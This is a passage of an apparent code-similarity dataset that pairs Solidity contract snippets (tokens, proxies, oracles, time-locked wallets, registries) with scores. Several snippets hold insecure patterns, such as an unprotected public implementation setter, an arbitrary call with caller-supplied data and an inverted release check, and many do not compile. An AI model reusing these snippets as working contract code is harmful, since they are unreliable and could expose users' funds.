             balances[owner] -= _value;
             balances[addresses[i]] += _value;
             Transfer(owner, addresses[i], _value);
         }
    }
    
    function balanceOf(address _owner) constant public returns (uint256) {
	 return balances[_owner];
    }

    
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

         if (balances[msg.sender] >= _amount
             && _amount > 0
             && balances[_to] + _amount > balances[_to]) {
             balances[msg.sender] -= _amount;
             balances[_to] += _amount;
             Transfer(msg.sender, _to, _amount);
             return true;
         } else {
             return false;
         }
    }
    
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

         if (balances[_from] >= _amount
             && allowed[_from][msg.sender] >= _amount
             && _amount > 0
             && balances[_to] + _amount > balances[_to]) {
             balances[_from] -= _amount;
             allowed[_from][msg.sender] -= _amount;
             balances[_to] += _amount;
             Transfer(_from, _to, _amount);
             return true;
         } else {
            return false;
         }
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        
        allowed[msg.sender][_spender] = _value;
        
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function finishDistribution() onlyOwner public returns (bool) {
    distributionFinished = true;
    DistrFinished();
    return true;
    }

    function withdrawForeignTokens(address _tokenContract) public returns (bool) {
        require(msg.sender == owner);
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}"
"contract CheckBet is usingOraclize {

struct Weather {
    uint curr_temperature;
    uint high_temperature;
    uint low_temperature;
}
Weather weather;


event Log(string text);

function CheckBet() {
    get_weather_status();
}

function get_weather_status() payable{
    Log(""Oraclize query was sent, waiting for the answer..""); 
    (oraclize_query(""URL"",""json(http:
}


function __callback(bytes32 _myid, string _result) {
    require (msg.sender == oraclize_cbAddress());
    Log(_result);
    weather.low_temperature = parseInt(_result); 
}",0.5234114741538659,"contract Storage {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    mapping(bytes32 => string) data;

    function set(bytes32 key, string memory value) public {
        require(
            bytes(data[key]).length == 0,
            ""username has already been taken""
        );
        data[key] = value;
    }

    function get(bytes32 key) public view returns (string memory) {
        return data[key];
    }

    function del(bytes32 key) public {
        require(msg.sender == owner, ""only the owner can delete names"");
        delete data[key];
    }
}"
"contract LFC is Mortal {

    
    

    bytes3 private constant defaultBaseCurrency = ""Eth"";

    bytes32 private constant orderName = ""Order DB"";
    bytes32 private constant forexName = ""Forex DB"";
    bytes32 private constant depositName = ""Deposit DB"";    

    Exchanger private exchanger;
    ExternalStorage private storageContract;
    OrderDB private orderDB;
    DepositDB private depositDB;
    ForexDB private forexDB;
    ContractManagerDB private contractManagerDB;

    

    function createExchanger() public {
        exchanger = new Exchanger();
    }

    function createStorage() public onlyOwner {
        storageContract = new ExternalStorage();
        storageContract.changeOwner(exchanger);
    }

    function createContractManager() public onlyOwner {
        contractManagerDB = new ContractManagerDB();
        contractManagerDB.setStorage(storageContract);
        contractManagerDB.changeOwner(address(exchanger));       
        exchanger.setContractManager(contractManagerDB);
    }

    function createOrderContract() public onlyOwner {
        orderDB = new OrderDB();
        orderDB.setStorage(storageContract);
        orderDB.changeOwner(address(exchanger));
        
    }

    function createForexContract() public onlyOwner {
        forexDB = new ForexDB();
        forexDB.setStorage(storageContract); 
        forexDB.changeOwner(address(exchanger));
        
    }   

    function createDepositContract() public onlyOwner {
        depositDB = new DepositDB();
        depositDB.setStorage(storageContract);
        depositDB.changeOwner(address(exchanger));
        
    }

    function addAdmin() public onlyOwner {
        storageContract.addAdmin(exchanger);
        storageContract.addAdmin(depositDB);
        storageContract.addAdmin(forexDB);      
        storageContract.addAdmin(orderDB);           
        storageContract.addAdmin(contractManagerDB);
    }

    function addContracts() public {
        contractManagerDB.addContract(orderName,orderDB);
        contractManagerDB.addContract(forexName,forexDB);
        contractManagerDB.addContract(depositName,depositDB);
        exchanger.setNames(orderName,forexName,depositName);
    }

    function setForexBase() public {
        forexDB.setBase(defaultBaseCurrency);
    }

    function getExchanger() public constant returns (address) {
        return exchanger;
    }
}",0.512722047876202,"contract Proxy {
    using Address for address;

    mapping(string => address) moduleMap;
    mapping(address => bool) insideContracts;   

    event AddInsideContract(address _contract);
    event AddInsideContracts(address[] _contracts);
    event RemoveInsideContract(address _contract);
    event UpdateModule(string _moduleName, address _preModule, address _newModule);

    modifier onlyAdmin() {
        AuthModule auth = AuthModule(getModule(""AuthModule""));
        require(auth.isAdmin(msg.sender), ""Need be admin"");
        _;
    }
    
    constructor(address authModule) public {
        _updateModule(""AuthModule"", authModule, true);
    }

    function addInsideContract(address _contract) public onlyAdmin {
        _addInsideContract(_contract);
    }

    function _addInsideContract(address _contract) private {
        
        insideContracts[_contract] = true;
        emit AddInsideContract(_contract);
    }
    
    function addInsideContracts(address[] _contracts) public onlyAdmin {
        for(uint i = 0; i < _contracts.length; i++) {
            
            insideContracts[_contracts[i]] = true;
        }
        emit AddInsideContracts(_contracts);
    }

    function removeInsideContract(address _contract) public onlyAdmin {
        _removeInsideContract(_contract);
    }

    function _removeInsideContract(address _contract) private {
        delete insideContracts[_contract];
        emit RemoveInsideContract(_contract);
    }

    
    function isInsideContract(address _contract) public view returns (bool) {
        return _contract.isContract() && insideContracts[_contract] == true;
    }

    function updateModule(string _moduleName, address _module, bool _insideContract) public onlyAdmin {
        _updateModule(_moduleName, _module, _insideContract);
    }

    function _updateModule(string _moduleName, address _module, bool _insideContract) private {
        address preModule = moduleMap[_moduleName];
        if(preModule != address(0))
            _removeInsideContract(preModule);
        moduleMap[_moduleName] = _module;
        if(_insideContract && _module != address(0))
            _addInsideContract(_module);
        emit UpdateModule(_moduleName, preModule, _module);
    }

    function getModule(string _moduleName) public view returns (address) {
        return moduleMap[_moduleName];
    } 
    
}"
"contract Test {
    bytes32 lastblockhashused;
    uint lastblocknumberused;
    uint AA;

    function test() {
        lastblocknumberused = (block.number-1)  ;               
        lastblockhashused = block.blockhash(lastblocknumberused);
    }

    function getTest1() constant returns (uint) {
        return uint(lastblockhashused) & 0xfff;
    }

    function Test2() {
        AA=(uint(lastblockhashused) & 0xfff);
        return; 
    }

    function getTest2AA() constant returns (uint) {
        return AA;
    }
}",0.5966769288228359,"contract myTime is mortal
{
    uint deployTime;

    
    function myTime() public
    {
        deployTime = block.timestamp;
    }

    function getBlockNumber() constant returns (uint)
    {
        return block.number;
    }

    function getDeployTime() constant returns (uint)
    {
        return deployTime;
    }

    function getBlockTime() constant returns (uint)
    {
        return block.timestamp;
    }

    function getNowTime() constant returns (uint)
    {
        return now;
    }
}"
"contract Test {


event test1(address a,uint16 b,uint16 c,uint16 d,uint16 e);
event test2(address a,uint128 f,uint16 g);
event test3(address a,uint128 f,bool h);


function method1(uint16 a,uint16 b,uint16 c,uint16 d) external payable {



    emit test1(msg.sender,a,b,c,d);
}


function method2(uint128 f,uint16 g) external payable {



    emit test2(msg.sender,f,g);
}


function method3(uint128 f) external payable {



    emit test3(msg.sender,f,true);
}


}",0.5389050982928779,"contract Pausable {
    
    event Paused(address account);

    
    event Unpaused(address account);

    bool private _paused;

    
    function paused() public view returns (bool) {
        return _paused;
    }

    
    modifier whenNotPaused() {
        require(!_paused, ""Pausable: paused"");
        _;
    }

    
    modifier whenPaused() {
        require(_paused, ""Pausable: not paused"");
        _;
    }

    
    function _pause() internal {
        _paused = true;
        emit Paused(msg.sender);
    }

    
    function _unpause() internal {
        _paused = false;
        emit Unpaused(msg.sender);
    }
}"
"contract Platoonfactory {
    event PlatoonCreated(address owner, uint256 platoonId);

    uint256 public currentPlatoonID = 1;
    uint256 public contractBalance = address(this).balance;

    
    struct Platoon {
        uint256 platoonId;
        address payable owner;
        uint costPerMinute;
        uint startDate;
        uint endDate;
        
        mapping(uint  => TruckInPlatoon) participants;
        uint participantsSize;
    }

    
    struct TruckInPlatoon {
        uint platoonId;
        address truckOwner;
        uint startDate;
        uint allowedParticipationUntilDate;
        uint payedAmountOfWei;
    }

    
    mapping(address => uint) public platoonOwners;
    
    mapping(uint => Platoon) public platoons;


    
    function createPlatoon(uint cpm, uint endDate) public returns (uint) {
        require(platoonOwners[msg.sender] == 0, ""You have already started a platoon"");
        require(endDate >= 1, ""Platoon must at least be available for one hour"");

        
        platoons[currentPlatoonID] = Platoon({platoonId: currentPlatoonID, owner: msg.sender, costPerMinute: cpm, startDate: now, endDate: (now + endDate*3600), participantsSize:0});
        platoonOwners[msg.sender] = currentPlatoonID;

        
        currentPlatoonID++;

        
        emit PlatoonCreated(msg.sender, currentPlatoonID);
        return currentPlatoonID - 1;
    }

}",0.5865069851384177,"contract TimeLockedWallet {



    address public creator;

    address public owner;

    uint public unlockDate;

    uint public createdAt;



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    constructor(

        address _creator,

        address _owner,

        uint _unlockDate

    ) public {

        creator = _creator;

        owner = _owner;

        unlockDate = _unlockDate;

        createdAt = now;

    }



    

    function() payable public { 

        emit Received(msg.sender, msg.value);

    }



    

    function withdraw() onlyOwner public {

       require(now >= unlockDate);

       address myAddress = this;

       

       

       msg.sender.transfer(myAddress.balance);

       emit Withdrew(msg.sender, myAddress.balance );

    }



    

    function withdrawTokens(address _tokenContract) onlyOwner public {

       require(now >= unlockDate);

       ERC20 token = ERC20(_tokenContract);

       

       uint tokenBalance = token.balanceOf(this);

       token.transfer(owner, tokenBalance);

       emit WithdrewTokens(_tokenContract, msg.sender, tokenBalance);

    }



    function info() public view returns(address, address, uint, uint, uint) {

        return (creator, owner, unlockDate, createdAt, address(this).balance);

    }



    event Received(address from, uint amount);

    event Withdrew(address to, uint amount);

    event WithdrewTokens(address tokenContract, address to, uint amount);

}"
"contract certificarProceso {

    address public creador;
    address emisor;
    string informacion;
    string informacionHashArchivo;

    function escribirInformacion(string memory informacion1, string memory informacionHashArchivo1) public {
        informacion = informacion1;
        informacionHashArchivo = informacionHashArchivo1;
    }

    function getInformacion() public view returns (string memory) {
        return informacion;
    }

    function getInformacionArchivoHash() public view returns (string memory) {
        return informacionHashArchivo;
    }
}",0.5435627476973666,"contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function name() public view returns(string memory) {
    return _Tokenname;
  }

  function symbol() public view returns(string memory) {
    return _Tokensymbol;
  }

  function decimals() public view returns(uint8) {
    return _Tokendecimals;
  }
}"
"contract Test {



struct StudentType {
    uint8 bonus;        
    uint16 value1;      
    uint16 value2;      
    uint16 Priority;    
}

mapping (address => StudentType) public studentsByAddress; 
mapping (uint256 => address) public studentsByInsertId; 
uint256 public studentCount = 0;

function saveNewRecord(address _address, uint8 _bonus, uint16 _value1, uint16 _value2) public {          

    
    StudentType storage student = studentsByAddress[_address]; 
    student.bonus = _bonus;
    student.value1 = _value1;
    student.value2 = _value2;

    student.Priority = this.calculatePriority( _value1, _value2, _bonus);

    
    
    
    studentsByInsertId[studentCount++] = _address;

}



function calculatePriority(uint16 _value1, uint16 _value2, uint8 _bonus) pure public returns ( uint16 ) {
    
    uint256 result = ( ( ( 50 * _value1 ) + ( 50 * _value2 ) ) / _bonus ) / 100;

    
    return uint16( result );
}


function get_ESU(address ins) view public returns (uint, uint, uint) {
    return (
        studentsByAddress[ins].value1,
        studentsByAddress[ins].value2,
        studentsByAddress[ins].Priority
    );
}

 }",0.5848807465130064,"contract ERC223 {
    function balanceOf(address who) public view returns (uint);

    function name() public view returns (string _name);
    function symbol() public view returns (string _symbol);
    function decimals() public view returns (uint8 _decimals);
    function totalSupply() public view returns (uint256 _supply);

    function transfer(address to, uint value) public returns (bool ok);
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok);

    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
}"
"contract MainContract is usingOraclize {
    ...

    address minter;
    uint public returnRate;

    ...

    function MainContract(uint _returnRate) {
        minter = msg.sender;
        returnRate = returnRate;
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    }        

    modifier onlyMinter {
        if (msg.sender != minter) throw;
        _;
    }

     function updateReturnRate(uint newReturnRate) onlyMinter {
        returnRate = newReturnRate;
     }

     ...    

}",0.5746035260247708,"contract Managed {

    

    

    modifier onlyManager { require(msg.sender == manager); _; }



    address public manager;



    constructor() public { manager = msg.sender;}



    

    

    function changeManager(address _newManager) public onlyManager {

        manager = _newManager;

    }

    

    

    

    

    function isContract(address _addr) view internal returns(bool) {

        uint size = 0;

        assembly {

            size := extcodesize(_addr)

        }

        return size > 0;

    }

}"
"contract SampleContract {
    uint storageData;

    event MamboNumberTwo(uint _value);
    event MamboNumberFive(uint _value);
    event MamboNumberString(string _value);

    function test(uint x, uint y, string memory s) public {
        emit MamboNumberTwo(x);
        emit MamboNumberFive(y);
        emit MamboNumberString(s);
    }
}",0.5192653253185999,"contract GivingLog {
    using SafeMath for uint128;

    event Give(address give, address take, uint128 amount, string ipfs);

    function logGive(address _to, string _ipfs) public payable{
        require(msg.value > 0);
        _to.transfer(uint128(msg.value));
        emit Give(msg.sender, _to, uint128(msg.value), _ipfs);
    }

}"
"contract B {
    event eventFallback();
}",0.5184543793793568,contract modularFast is F3Devents {}
"contract MyContract {
     uint start;
    mapping (uint => uint) public blockTime;
function addBlock public (){
   uint num++;
    blockTime[num]=block.timestamp;

    start=blockTime[1];

}
    function specificTime(uint event) public {
     
    require (block.timestamp <= start + 10 minutes); 

        
        myEvent(event);
    }
}",0.5583982199083274,"contract R256 {

    mapping(uint => uint) public record;

    event R(uint z);

    constructor() public {}

    function addRecord(uint z) public {
        require(record[z] == 0);
        record[z] = now;
        emit R(z);
    }

    function addMultipleRecords(uint[] zz) public {
        for (uint i; i < zz.length; i++) {
            addRecord(zz[i]);
        }
    }

}"
"contract Simple {
  uint public data; 
  event Notify(uint newData);

  function setData(uint _data) { data = _data; }
  function setDataAndNotify(uint _data) { setData(_data); Notify(_data); }
}",0.5459813816176832,"contract Notifier {
    constructor () public {}
    
    event Notify(address indexed who, uint256 value, bytes data);

    function() public payable {
        emit Notify(msg.sender, msg.value, msg.data);
    }
}"
"contract Base {

bytes32 internal constant IMPLEMENTATION_SLOT = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3;


function _setImplementation(address newImplementation) public {
   bytes32 slot = IMPLEMENTATION_SLOT;

   assembly {
     sstore(slot, newImplementation)
   }
}

function _implementation() public view returns (address impl) {
   bytes32 slot = IMPLEMENTATION_SLOT;
   assembly {
     impl := sload(slot)
   }
}

function getSlot() public view returns(bytes32) {
    return IMPLEMENTATION_SLOT;
}
}",0.5348110469607991,"contract Proxy {



    

    function _implementation() internal view returns (address);



    

    function _fallback() internal {

        _delegate(_implementation());

    }



    

    function _delegate(address implementation) internal {

        

        assembly {

            

            

            

            calldatacopy(0, 0, calldatasize)



            

            

            let result := delegatecall(gas, implementation, 0, calldatasize, 0, 0)



            

            returndatacopy(0, 0, returndatasize)



            switch result

            

            case 0 { revert(0, returndatasize) }

            default { return(0, returndatasize) }

        }

    }



    function () public payable {

        _fallback();

    }

}"
"contract WolframAlpha is usingOraclize {

    uint256 public beginningPastQuarter;
    uint256 public beginningCurrentQuarter;
    uint256 public payoutIntervalSeconds;

    event newOraclizeQuery(string description);
    event newTimestampMeasure(uint256 timestamp);

     constructor() public {
        payoutIntervalSeconds = 120;
        beginningPastQuarter = 0;
        beginningCurrentQuarter = 0;
        OAR = OraclizeAddrResolverI(0xB69156280a1461003a079387c2B5B827B3f0fc53);
    }

    function stringToUint(string memory s) internal pure returns (uint) {
        bytes memory b = bytes(s);
        uint result = 0;
        for (uint i = 0; i < b.length; i++) { 
            if (uint8(b[i]) >= 48 && uint8(b[i]) <= 57) {
                result = result * 10 + (uint8(b[i]) - 48); 
            }
        }
        return result; 
    }

    function __callback(bytes32 myid, string memory result) public {
        if (msg.sender != oraclize_cbAddress()) revert();

        uint256 t = stringToUint(result);
        if (t-beginningCurrentQuarter >= payoutIntervalSeconds){
            beginningPastQuarter = beginningCurrentQuarter;
            beginningCurrentQuarter = t;
        }

        emit newTimestampMeasure(t);
    }

    function getUTCTimestamp(uint256 delay) public payable {
        emit newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");
        oraclize_query(delay,""WolframAlpha"", ""Timestamp now"");
    }

    function pay(address receiver) public payable{
        address(uint160(receiver)).send(msg.value);
    }

    function balance(address a) public returns(uint256 r){
        return a.balance;
    }
}",0.5877136017268891,"contract SMT is StandardToken {



    function () public {

        revert();

    }



    string public name = ""SmartMesh Token"";                   

    uint8 public decimals = 18;                

    string public symbol = ""SMT"";                 

    string public version = 'v0.1';       

    uint256 public allocateEndTime;



    

    

    mapping(address => uint256) nonces;



    function SMT() public {

        allocateEndTime = now + 1 days;

    }



    

    function getNonce(address _addr) public constant returns (uint256){

        return nonces[_addr];

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        

        

        

        if(!_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { revert(); }

        return true;

    }



    

    function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        

        if(!_spender.call(_extraData)) { revert(); }

        return true;

    }



    

    

    

    function allocateTokens(address[] _owners, uint256[] _values) public onlyOwner {



        if(allocateEndTime < now) revert();

        if(_owners.length != _values.length) revert();



        for(uint256 i = 0; i < _owners.length ; i++){

            address to = _owners[i];

            uint256 value = _values[i];

            if(totalSupply + value <= totalSupply || balances[to] + value <= balances[to]) revert();

            totalSupply += value;

            balances[to] += value;

        }

    }

}"
"contract RefundableCrowdsale is FinalizableCrowdsale {
        ⋮ 
    RefundEscrow private _escrow;
        ⋮ 
    constructor(uint256 goal) public {
        require(goal > 0, ""Goal should be greater than zero."");
        _escrow = new RefundEscrow(wallet());
        _goal = goal;
    }
        ⋮ 
    function _forwardFunds() internal {
        _escrow.deposit.value(msg.value)(msg.sender); 
    }
}",0.5481930768139957,"contract Crowdsale {

    address public wallet = 0x11; 

    uint256 public rate = 1;

    MMEToken public token;

    

    constructor() public {

        token = new MMEToken();

    }

    

    function buyTokens() public payable {

        require(msg.value != 0);

        uint256 tokenAmount = msg.value * rate;

        token.mint(msg.sender, tokenAmount);

        wallet.transfer(msg.value);

    }

}"
"contract getSome {

    finalizeToken token;


    constructor() {
        token = finalizeToken(0xdc0974e65e479fa587118eb7588f426229a39d31);
    }

    function testWrite() public returns (bool) {
        setval();
    }

    function setval()  {
        token.setEpoch(8000);
    }

}",0.5984211965345675,"contract ITokenPool {    

    
    ERC20StandardToken public token;

    
    function setTrustee(address trustee, bool state) public;

    
    
    function getTokenAmount() public constant returns (uint256 tokens) {tokens;}
}"
"contract UnitCounter {
    mapping (address => uint256) public UnitsFrom;
    uint256 public TotalUnits;

    function submitUnits(uint256 Units) {
        UnitsFrom[msg.sender] = Units;
        TotalUnits += Units;
    }
}",0.588122229438598,"contract CrypteloERC20{
  mapping (address => uint256) public balanceOf;
  function transfer(address to, uint amount);
  function burn(uint256 _value) public returns (bool success);
}"
"contract SaveData {
    address[] addrs;
    string[] hashSet;
    xyz asd = xyz();
    function Save(address PubAddress) {
        require(asd.pass(PubAddress)==true);
        addrs.push(PubAddress);    

    }

    function saveHash(string hashStr) {
        hashSet.push(hashStr);
    }
}",0.5397125234187994,"contract MaharlikaAssetRegistry {

    address assetAddress;

    function _setAssetAddress(address _address) internal {
        assetAddress = _address;
    }

    function getAssetAddress() public view returns(address) {
        return assetAddress;
    }
}"
"contract Doctor is User {
    
    function addRecord(bytes32 patientID, bytes32 _id, bytes32 _category, bytes32 _hash) {
        
        address _patient = registry.getContractAddress(patientID); 
        
        Patient patient = Patient(_patient);
        patient.addRecord(_id, _category, _hash);
    }
}",0.5318050577936756,"contract ICertification {

  event Certificate(bytes32 indexed certHash, bytes32 innerHash, address indexed certifier);

  event Revocation(bytes32 indexed certHash, bool invalid);  

  address public newAddress;

  uint public genesis;

}"
"contract MembersMODDED {

    mapping (address => uint) public memberId;
    Member[] public members; 

    struct Member {  
        string Name;
        string SurName;
        address MemberAccountNo;
        bool IsActive;
        int AccountType;
        uint MemberNo;
        uint memberSince;
    }

    function Members( ) { 

    }

    function changeMembership(address memberAccountNo, bool isActive, string name, string surName,int accountType,uint memberNo) {
        uint id;
        if (memberId[memberAccountNo] == 0) {
            memberId[memberAccountNo] = memberNo;
            id = memberNo;
            members[id] = Member({MemberAccountNo: memberAccountNo, IsActive: isActive, memberSince: now, Name: name, SurName: surName, AccountType: accountType, MemberNo: memberNo});
        } else {
            id = memberId[memberAccountNo];
            Member m = members[id];
            m.IsActive = isActive;
            m.Name = name;
           m.SurName = surName;
        }  
    } 
}",0.5052591216863207,"contract Vault is Ownable {

  TokenContract public tkn;



  uint256 public releaseDate;



  struct Member {

    address memberAddress;

    uint256 tokens;

  }



  Member[] public team;



  

  constructor() public {

    releaseDate = 1561426200; 

  }



  

  function releaseTokens() onlyOwner public {

    require(releaseDate > block.timestamp);

    uint256 amount;

    for (uint256 i = 0; i < team.length; i++) {

      require(tkn.transfer(team[i].memberAddress, team[i].tokens));

    }

    amount = tkn.balanceOf(address(this));

    require(tkn.transfer(owner, amount));

    selfdestruct(owner);

  }



  

  function addMembers(address[] _member, uint256[] _tokens) onlyOwner public {

    require(_member.length > 0);

    require(_member.length == _tokens.length);

    Member memory member;

    for (uint256 i = 0; i < _member.length; i++) {

      member.memberAddress = _member[i];

      member.tokens = _tokens[i];

      team.push(member);

    }

  }

}"
"contract ContractRelay {
  address public contractAddress;

  function setPotContractAddress (address _contractAddress) public {
    contractAddress = _contractAddress;
  }
}",0.5965016113917941,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract MyContract {
    event ContractCreated(address newAddress);

    constructor() public { }

    function createOtherContract() public {
        address contractAddress = address(contract);
        emit ContractCreated(contractAddress);
    }
}",0.5847757502872496,"contract CommonModifiersInterface {



  

  function isContract(address _targetAddress) internal constant returns (bool);



  

  modifier onlyContractAddress(address _targetAddress) {

    require(isContract(_targetAddress) == true);

    _;

  }

}"
"contract Ballot {

    struct Play {
        uint cod_music;
        uint qtd;
    }

    struct Listener{
        address user;
        Play[] listened;
    }

    Listener[] listeners;
    Play[] tests;

    function listenMusic(uint cod) public {
        tests.push(Play({
            cod_music: cod,
            qtd: 1
        }));

        listeners.push(Listener({
            user: msg.sender,
            listened: tests
        }));
    }
}",0.5269143231227839,"contract test{

    uint256 public i;

    address public owner;

    

    constructor() public{

        owner = msg.sender;

    }

    

    function add(uint256 a, uint256 b) public pure returns (uint256){

        return a + b;

    }

    

    function setI(uint256 m) public {

        require(msg.sender == owner, ""owner required"");

        i = m;

    }

}"
"contract ValidReceiver is ERC721TokenReceiver {

      event  LOGTokenFallBack(address from,bytes4 value);

      function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4 value) {
            emit LOGTokenFallBack(_from, bytes4(keccak256(""onERC721Received(address,address,uint256,bytes)"")));
            return 0x150b7a02;

     } 
}",0.5942572732163436,"contract LghTransferTool is Owned {

    

    function batchTransfer256(address tokenAddress,address _from,address[] _tos, uint256[] _value) onlyOwner public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

            if(!tokenAddress.call(id,_from,_tos[i],_value[i])){

                break;

            }

        }

        return true;

    }

    

}"
"contract SmartIdentityRegistry {

address private owner;
uint constant PENDING = 0;
uint constant ACTIVE = 1;
uint constant REJECTED = 2;


function SmartIdentityRegistry() {
    owner = msg.sender;
}


struct SIContract {
    bytes32 hash;
    address submitter;
    uint status;
}


mapping(bytes32 => SIContract) public sicontracts;


modifier onlyBy(address _account) {
    if (msg.sender != _account) {
        revert();
    }
    _;
}


function submitContract(bytes32 _contractHash, address idOwner) returns(bool) {
    var sicontract = sicontracts[_contractHash];
    sicontract.hash = _contractHash;
    sicontract.submitter = idOwner;
    sicontract.status = PENDING;
    return true;
}


function approveContract(bytes32 _contractHash) returns(bool) {
    var sicontract = sicontracts[_contractHash];
    if(sicontract.submitter != msg.sender){
        return false;
    }
    sicontract.status = ACTIVE;
    return true;
}


function rejectContract(bytes32 _contractHash) onlyBy(owner) returns(bool) {
    var sicontract = sicontracts[_contractHash];
    sicontract.status = REJECTED;
    return true;
}


function deleteContract(bytes32 _contractHash) returns(bool) {
    var sicontract = sicontracts[_contractHash];
    if (sicontract.status != REJECTED) {
        if (sicontract.submitter == msg.sender) {
            if (msg.sender == owner) {
                delete sicontracts[_contractHash];
                return true;
            }
        }
    } else {
        revert();
    }
}


function isValidContract(bytes32 _contractHash) returns(bool) {
    if (sicontracts[_contractHash].status == ACTIVE) {
        return true;
    }
    if (sicontracts[_contractHash].status == REJECTED) {
        revert();
    } else {
        return false;
    }
}
}",0.5408988217019286,"contract Ethernity is StandardToken {

  string public constant name = ""ETHerNity""; 

  string public constant symbol = ""ETY""; 

  uint8 public constant decimals = 18; 



  address owner;

  mapping(address => uint) lastDate;



  constructor() public {

    owner = msg.sender;

  }



  function() public payable {

    payWithReferrer(owner);

  }



  function payWithReferrer(address _addr) public payable {

    if (_addr == owner || balances[_addr] == 0 || _addr == msg.sender)

      owner.transfer(msg.value / 5);

    else {

      owner.transfer(msg.value / 10);

      _addr.transfer(msg.value / 10);

    }

    lastDate[msg.sender] = now;



    totalSupply_ = totalSupply_.add(msg.value);

    balances[msg.sender] = balances[msg.sender].add(msg.value / 30);

  }



  function withdraw() public returns(bool) {

    return withdrawFrom(msg.sender);

  }



  function withdrawFrom(address _addr) internal returns(bool) {

    bool result =  _addr.send( balanceToWithdraw() );

    lastDate[_addr] = now;

    return result;

  }

    

  function balanceToWithdraw() public view returns(uint) {

    return balanceToWithdrawFrom(msg.sender);

  }



  function balanceToWithdrawFrom(address _addr) internal view returns(uint) {

    if (lastDate[_addr] > 0)

      return balances[_addr].mul((now - lastDate[_addr]) / 1 days);

    else

      return 0;

  }

  

  function transfer(address _to, uint256 _value) public returns (bool) {

      withdraw();

      withdrawFrom(_to);

      return BasicToken.transfer(_to, _value);

  }



  function transferFrom(

    address _from,

    address _to,

    uint256 _value

  )

    public

    returns (bool)

  {

    withdrawFrom(_from);

    withdrawFrom(_to);

    return StandardToken.transferFrom(_from, _to, _value);

  }

}"
"contract Admin {
    function adminDoesSomething () { if(stage == 1){ stage = 2} }
}",0.5436916484339799,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract User {
    function userDoesSomething () { if(stage == 2){ stage = 3} }
}",0.5779909965142622,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract Operator {
    function operatorDoesSomething () { if(stage == 3){ stage = 4} }
}",0.54953895693825,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract System {
    function systemDoesSomething () { if(stage == 4){ stage = 5} }
}",0.5538413645295007,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract FirstContract {

    bool isOne;
    bool isTwo;
    bool isThree;

    function foo(bytes32 _value) returns (uint errorCode) {

        if (!isOne) return 101;
        if (!isTwo) return 102;
        if (!isThree) return 103;

        if (SecondContract(""0x222"").bar(_value) != 0) return 201;

        
        
        

        if (ThirdContract(""0x333"").baz(_value) != 0) return 301;

        return 0;
    }
}",0.5496300518212244,"contract Token {

    function transfer(address receiver, uint amount) public returns (bool) {

        (receiver);

        (amount);

        return false;

    }



    function balanceOf(address holder) public view returns (uint) {

        (holder);

        return 0;

    }



    function approve(address _spender, uint256 _value) public returns (bool) {

        (_spender);

        (_value);

        return false;

    }

}"
"contract Voting {
    bytes32[] public encryptedVotes;
    bytes32[] public candidateList;
    address[] public pollingStationList;
    address public owner;
    function Voting(bytes32[] _candidateList, address[] _pollingStationList) public {
        candidateList = _candidateList;
        pollingStationList = _pollingStationList;
        owner = msg.sender;
    }

    function vote(bytes32 encryptedVote) public {
        encryptedVotes.push(encryptedVote);
    }

    function getEncryptedVotes() view public returns (bytes32[]) {
        return encryptedVotes;
    }
}",0.5900773954728079,"contract ENSRegistry {

    function owner(bytes32 _node) public view returns (address);

    function resolver(bytes32 _node) public view returns (address);

    function ttl(bytes32 _node) public view returns (uint64);

    function setOwner(bytes32 _node, address _owner) public;

    function setSubnodeOwner(bytes32 _node, bytes32 _label, address _owner) public;

    function setResolver(bytes32 _node, address _resolver) public;

    function setTTL(bytes32 _node, uint64 _ttl) public;

}"
"contract Registration {

    struct staffMemberData {
        string name;
        bytes32[5] staffMemberAttributes;
    }

    mapping (address => staffMemberData) staff;
    address[] public staffMemeberAccts;

    function setData(address _address, bytes32[5] _attributes, string _fName) public {
        var s = staff[_address];

        uint256 arraylength = 5;
        uint8 x = 0;
        while(x < arraylength)
        {
            s.staffMemberAttributes[x] = _attributes[x]; 
            x++;
        }

        s.name = _fName;

        staffMemeberAccts.push(_address) -1;
    }


    function getData() view public returns (address[]) {
